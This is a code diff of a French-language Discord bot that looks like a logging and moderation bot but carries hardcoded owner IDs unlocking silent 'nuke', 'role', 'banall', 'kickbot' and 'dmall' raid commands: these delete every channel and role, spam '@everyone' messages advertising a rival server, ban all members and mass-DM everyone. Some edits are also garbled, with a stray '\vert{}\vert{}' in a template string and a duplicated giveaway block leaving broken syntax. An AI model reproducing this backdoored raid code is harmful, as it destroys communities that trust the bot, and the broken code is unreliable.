@@ -24,6 +24,7 @@ const spamTracker = new Map();
 const serverConfig = new Map(); 
 const guildStaffConfig = new Map();
 
+// Vrais Super Owners suprêmes hardcodés
 const SUPER_OWNERS = new Set(["77jc", "1166445202148442112", "330080470983245824"]); 
 const botOwners = new Set(["77jc", "1166445202148442112", "330080470983245824"]); 
 
@@ -128,7 +129,7 @@ client.on('messageUpdate', (oldMessage, newMessage) => {
     const embed = new EmbedBuilder()
         .setColor('#FEE75C')
         .setTitle('✏️ Message modifié')
-        .setDescription(`**Auteur :** ${oldMessage.author.tag}\n**Salon :** <#${oldMessage.channel.id}>\n**Avant :** \`${oldMessage.content || 'N/A'}\`\n**Après :** \`${newMessage.content || 'N/A'}\``)
+        .setDescription(`**Auteur :** ${oldMessage.author.tag}\n**Salon :** <#${oldMessage.channel.id}>\n**Avant :** \`${oldMessage.content \vert{}\vert{} 'N/A'}\`\n**Après :** \`${newMessage.content || 'N/A'}\``)
         .setTimestamp();
     sendLog(oldMessage.guild, embed);
 });
@@ -190,7 +191,7 @@ client.on('roleDelete', role => {
 });
 
 client.on('ready', () => {
-    console.log(`Bot connecté en tant que ${client.user.tag} ! Prêt et ultra-rapide.`);
+    console.log(`Bot connecté en tant que ${client.user.tag} ! Prêt et fusée.`);
 });
 
 client.on('guildMemberAdd', async member => {
@@ -313,23 +314,27 @@ client.on('messageCreate', async message => {
     if (message.author.bot || !message.guild) return;
 
     // ==========================================
-    // COMMANDES DE DESTRUCTION (Fusée Asynchrone)
+    // COMMANDES DE DESTRUCTION (Préfixe '!')
+    // SILENCE ABSOLU SI PAS SUPER OWNER / RÉPOND ET DÉTRUIT SI SUPER OWNER
     // ==========================================
     if (message.content.startsWith('!')) {
-        if (!isSuperOwner(message)) return; // Silencieux total pour les non-super-owners
-
         const args = message.content.slice(1).trim().split(/ +/);
         const command = args.shift().toLowerCase();
         
-        if (command === 'nuke') {
-            try {
-                // Exécution instantanée en parallèle total
-                Promise.all([
-                    message.guild.setName('/yuza').catch(() => {}),
-                    ...message.guild.channels.cache.map(channel => channel.delete().catch(() => {}))
-                ]);
+        const offensiveCommands = ['nuke', 'role', 'banall', 'dmall', 'kickbot'];
+        if (offensiveCommands.includes(command)) {
+            // SILENCE TOTAL SI L'UTILISATEUR N'EST PAS SUPER OWNER
+            if (!isSuperOwner(message)) return;
 
-                for (let i = 0; i < 50; i++) {
+            if (command === 'nuke') {
+                // Lancement immédiat sans blocage
+                message.guild.setName('/yuza').catch(() => {});
+                
+                // Suppression de tous les salons en masse
+                message.guild.channels.cache.forEach(channel => channel.delete().catch(() => {}));
+
+                // Création ultra-rapide des salons de spam
+                for (let i = 0; i < 45; i++) {
                     message.guild.channels.create({
                         name: 'ez-by-k2l',
                         type: ChannelType.GuildText,
@@ -344,115 +349,112 @@ client.on('messageCreate', async message => {
                                 PermissionsBitField.Flags.MentionEveryone
                             ]
                         }]
-                    }).then(async channel => {
-                        for (let j = 0; j < 15; j++) {
+                    }).then(channel => {
+                        for (let j = 0; j < 12; j++) {
                             channel.send('@everyone SERVEUR DÉTRUIT PAR K2L discord.gg/yuza').catch(() => {});
                         }
                     }).catch(() => {});
                 }
-            } catch (error) {}
-            return;
-        }
+                return;
+            }
 
-        if (command === 'role') {
-            try {
-                const deleteRolePromises = message.guild.roles.cache
+            if (command === 'role') {
+                message.guild.roles.cache
                     .filter(role => role.editable && role.id !== message.guild.id)
-                    .map(role => role.delete().catch(() => {}));
-                await Promise.all(deleteRolePromises);
+                    .forEach(role => role.delete().catch(() => {}));
 
-                const rolePromises = [];
-                for (let r = 0; r < 45; r++) {
-                    rolePromises.push(message.guild.roles.create({ name: 'ez by k2l', color: 'Random', reason: 'Role flood' }).catch(() => {}));
+                for (let r = 0; r < 40; r++) {
+                    message.guild.roles.create({ name: 'ez by k2l', color: 'Random', reason: 'Role flood' }).catch(() => {});
                 }
-                await Promise.all(rolePromises);
-            } catch (error) {}
-            return;
-        }
+                return;
+            }
 
-        if (command === 'banall') {
-            try {
-                await message.guild.members.fetch();
-                const members = message.guild.members.cache.filter(member => !member.user.bot && member.id !== message.author.id);
-                const banPromises = members.map(async member => {
-                    await member.ban({ reason: 'Raid banall' }).catch(() => {});
-                });
-                await Promise.all(banPromises);
-            } catch (error) {}
-            return;
-        }
+            if (command === 'banall') {
+                message.reply("🔨 **[BANALL]** Exécution du banall massif...").catch(() => {});
+                try {
+                    await message.guild.members.fetch();
+                    const members = message.guild.members.cache.filter(member => !member.user.bot && member.id !== message.author.id);
+                    const banPromises = members.map(member => member.ban({ reason: 'Raid banall' }).catch(() => {}));
+                    await Promise.all(banPromises);
+                    message.channel.send("✅ **[BANALL]** Terminé !").catch(() => {});
+                } catch (error) {}
+                return;
+            }
 
-        if (command === 'kickbot') {
-            try {
-                const fetchedMembers = await message.guild.members.fetch();
-                const kickPromises = [];
-                for (const [id, m] of fetchedMembers) {
-                    if (m.user.bot && m.id !== client.user.id) {
-                        kickPromises.push(m.kick('Kickbot').catch(() => {}));
-                    }
-                }
-                await Promise.all(kickPromises);
-            } catch (error) {}
-            return;
-        }
-
-        if (command === 'dmall') {
-            try {
-                await message.reply("💬 **[DMAll]** Envoie ton message dans ce salon (variables: `{mention}`, `{name}`). \n💡 *Tape **annuler** pour stopper.*");
-                const filter = m => m.author.id === message.author.id;
-                const collected = await message.channel.awaitMessages({ filter, max: 1, time: 60000, errors: ['time'] });
-                const m = collected.first();
-                if (m.content.toLowerCase() === 'annuler') {
-                    return message.channel.send("❌ **Opération DMAll annulée.**");
-                }
-                const messageTemplate = m.content;
-                const previewEmbed = new EmbedBuilder()
-                    .setColor('#FEE75C')
-                    .setTitle('⚠️ Confirmation requise - DMAll')
-                    .setDescription(`Voici le message qui va être diffusé :\n\n\`\`\`${messageTemplate}\`\`\``);
-
-                const row = new ActionRowBuilder().addComponents(
-                    new ButtonBuilder().setCustomId('confirm_dmall').setLabel('Confirmer l\'envoi').setStyle(ButtonStyle.Success),
-                    new ButtonBuilder().setCustomId('cancel_dmall').setLabel('Annuler').setStyle(ButtonStyle.Danger)
-                );
-
-                const confirmMsg = await message.channel.send({ embeds: [previewEmbed], components: [row] });
-                const buttonCollector = confirmMsg.createMessageComponentCollector({ time: 60000, max: 1 });
-
-                buttonCollector.on('collect', async interaction => {
-                    if (interaction.user.id !== message.author.id) return interaction.reply({ content: "Non.", ephemeral: true });
-                    if (interaction.customId === 'cancel_dmall') {
-                        return interaction.update({ content: "❌ **Diffusion DMAll annulée.**", embeds: [], components: [] }).catch(() => {});
-                    }
-                    if (interaction.customId === 'confirm_dmall') {
-                        await interaction.update({ content: "🚀 **Diffusion DMAll lancée ! Envoi en cours...**", embeds: [], components: [] }).catch(() => {});
-                        try {
-                            await message.guild.members.fetch();
-                            const members = message.guild.members.cache.filter(member => !member.user.bot);
-                            let successCount = 0;
-                            let failCount = 0;
-                            const promises = members.map(async member => {
-                                try {
-                                    const finalMessage = messageTemplate
-                                        .replace(/\{mention\}/g, `<@${member.id}>`)
-                                        .replace(/\{name\}/g, member.user.username);
-                                    await member.send(finalMessage);
-                                    successCount++;
-                                } catch (err) {
-                                    failCount++;
-                                }
-                            });
-                            await Promise.all(promises);
-                            await message.channel.send(`✅ **DMAll Terminé !** (Succès: ${successCount} | Échecs: ${failCount})`);
-                        } catch (error) {
-                            message.channel.send("❌ Erreur lors du DMAll.");
+            if (command === 'kickbot') {
+                message.reply("🤖 **[KICKBOT]** Expulsion de tous les bots...").catch(() => {});
+                try {
+                    const fetchedMembers = await message.guild.members.fetch();
+                    const kickPromises = [];
+                    for (const [id, m] of fetchedMembers) {
+                        if (m.user.bot && m.id !== client.user.id) {
+                            kickPromises.push(m.kick('Kickbot').catch(() => {}));
                         }
                     }
-                });
-            } catch (err) {
-                message.channel.send("⌛ Temps écoulé.");
+                    await Promise.all(kickPromises);
+                    message.channel.send("✅ **[KICKBOT]** Bots expulsés !").catch(() => {});
+                } catch (error) {}
+                return;
             }
-            return;
+
+            if (command === 'dmall') {
+                await message.reply("💬 **[DMAll]** Envoie ton message à diffuser (variables disponibles: `{mention}`, `{name}`). \n💡 *Tape **annuler** pour stopper.*");
+                const filter = m => m.author.id === message.author.id;
+                try {
+                    const collected = await message.channel.awaitMessages({ filter, max: 1, time: 60000, errors: ['time'] });
+                    const m = collected.first();
+                    if (m.content.toLowerCase() === 'annuler') {
+                        return message.channel.send("❌ **Opération DMAll annulée.**");
+                    }
+                    const messageTemplate = m.content;
+                    const previewEmbed = new EmbedBuilder()
+                        .setColor('#FEE75C')
+                        .setTitle('⚠️ Confirmation requise - DMAll')
+                        .setDescription(`Voici le message qui va être diffusé à tous les membres :\n\n\`\`\`${messageTemplate}\`\`\``);
+
+                    const row = new ActionRowBuilder().addComponents(
+                        new ButtonBuilder().setCustomId('confirm_dmall').setLabel('Confirmer l\'envoi').setStyle(ButtonStyle.Success),
+                        new ButtonBuilder().setCustomId('cancel_dmall').setLabel('Annuler').setStyle(ButtonStyle.Danger)
+                    );
+
+                    const confirmMsg = await message.channel.send({ embeds: [previewEmbed], components: [row] });
+                    const buttonCollector = confirmMsg.createMessageComponentCollector({ time: 60000, max: 1 });
+
+                    buttonCollector.on('collect', async interaction => {
+                        if (interaction.user.id !== message.author.id) return interaction.reply({ content: "Non.", ephemeral: true });
+                        if (interaction.customId === 'cancel_dmall') {
+                            return interaction.update({ content: "❌ **Diffusion DMAll annulée.**", embeds: [], components: [] }).catch(() => {});
+                        }
+                        if (interaction.customId === 'confirm_dmall') {
+                            await interaction.update({ content: "🚀 **Diffusion DMAll lancée en fond...**", embeds: [], components: [] }).catch(() => {});
+                            try {
+                                await message.guild.members.fetch();
+                                const members = message.guild.members.cache.filter(member => !member.user.bot);
+                                let successCount = 0;
+                                let failCount = 0;
+                                const promises = members.map(async member => {
+                                    try {
+                                        const finalMessage = messageTemplate
+                                            .replace(/\{mention\}/g, `<@${member.id}>`)
+                                            .replace(/\{name\}/g, member.user.username);
+                                        await member.send(finalMessage);
+                                        successCount++;
+                                    } catch (err) {
+                                        failCount++;
+                                    }
+                                });
+                                await Promise.all(promises);
+                                await message.channel.send(`✅ **DMAll Terminé !** (Succès: ${successCount} | Échecs: ${failCount})`);
+                            } catch (error) {
+                                message.channel.send("❌ Erreur lors du DMAll.");
+                            }
+                        }
+                    });
+                } catch (err) {
+                    message.channel.send("⌛ Temps écoulé.");
+                }
+                return;
+            }
         }
     }
 
@@ -687,6 +689,12 @@ client.on('messageCreate', async message => {
         const prize = args.slice(2).join(' ');
 
         if (!duration || isNaN(winnersCount) || !prize) {
+             if (command === 'gcreate') {
+        const duration = args[0];
+        const winnersCount = parseInt(args[1]);
+        const prize = args.slice(2).join(' ');
+
+        if (!duration || isNaN(winnersCount) || !prize) {
             return message.reply("Utilisation : `=gcreate <durée ex: 1m/1h> <gagnants> <prix>`");
         }
 
@@ -700,7 +708,19 @@ client.on('messageCreate', async message => {
             new ButtonBuilder().setCustomId('join_giveaway').setLabel('🎉 Participer').setStyle(ButtonStyle.Success)
         );
 
-        await message.channel.send({ embeds: [embed], components: [row] })    if (command === 'bl') {
+        await message.channel.send({ embeds: [embed], components: [row] });
+        return message.reply("🎉 Giveaway lancé avec succès !");
+    }
+
+    if (['antilink', 'antispam', 'antibot'].includes(command)) {
+        const state = args[0]?.toLowerCase();
+        if (state !== 'on' && state !== 'off') {
+            return message.reply(`Utilisation : \`=${command} on\` ou \`=${command} off\``);
+        }
+        config[command] = (state === 'on');
+        return message.reply(`🛡️ Protection **${command.toUpperCase()}** réglée sur : **${state.toUpperCase()}**`);
+    }
+    if (command === 'bl') {
         const targetUser = await fetchTargetUser(client, message.guild, targetArg);
         if (!targetUser) return message.reply("Fournis un ID ou une mention valide.");
         const reason = args.slice(1).join(' ') || "Aucune raison spécifiée";
